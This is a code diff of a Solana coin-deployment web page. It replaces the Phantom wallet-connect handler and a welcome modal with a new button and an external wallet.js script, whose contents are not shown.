@@ -9,8 +9,8 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet" />
   <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@700&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"><script src="./index.js"></script>
-  <script src="./index.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"><script src="./wallet.js"></script>
+  <script src="./wallet.js"></script>
   <script src="https://unpkg.com/@solana/web3.js@v1.33.0/lib/index.iife.js"></script>
   <style>
     * {
@@ -521,7 +521,9 @@
     <i class="fas fa-wallet"></i>
     <h2><span class="highlight">Connect Wallet</span></h2>
     <p>To deploy your coin, please connect your wallet securely using Voltrix.</p>
-  <button class="create-button connect-wallet">Connect Wallet</button>
+ <button id="connectWalletBtn" style="padding: 10px 20px; font-size: 1.2rem;">Connect Wallet</button>
+
+  <p id="walletAddress" style="margin-top: 20px; font-weight: bold;"></p>
 
   </div>
 </div>
@@ -534,49 +536,6 @@
   document.getElementById('closePopup').addEventListener('click', function () {
     document.getElementById('walletPopup').classList.remove('show-popup');
   });
-
-
-        // Fonctions pour le modal
-        function showModal() {
-            document.getElementById('modal').style.display = 'block';
-            document.body.style.overflow = 'hidden';
-        }
-
-        function closeModal() {
-            document.getElementById('modal').style.display = 'none';
-            document.body.style.overflow = 'auto';
-        }
-
-        // Afficher le modal au chargement
-        window.addEventListener('load', showModal);
-
-        // Fermer le modal en cliquant sur l'overlay
-        document.getElementById('modal').addEventListener('click', function(e) {
-            if (e.target === this) {
-                closeModal();
-            }
-        });
-
-  document.querySelector('.connect-wallet').addEventListener('click', async () => {
-    if (!window.solana || !window.solana.isPhantom) {
-      alert("Phantom wallet not found. Install from https://phantom.app");
-      return;
-    }
-
-    try {
-      const { publicKey } = await window.solana.connect();
-      const address = publicKey.toString();
-      console.log("✅ Connected:", address);
-
-      // Show it somewhere or store it
-      alert("Wallet connected: " + address);
-      document.getElementById('walletPopup').classList.remove('show-popup');
-    } catch (err) {
-      console.error("❌ Connection failed:", err);
-      alert("Connection failed: " + err.message);
-    }
-  });
-
 
 
 </script>
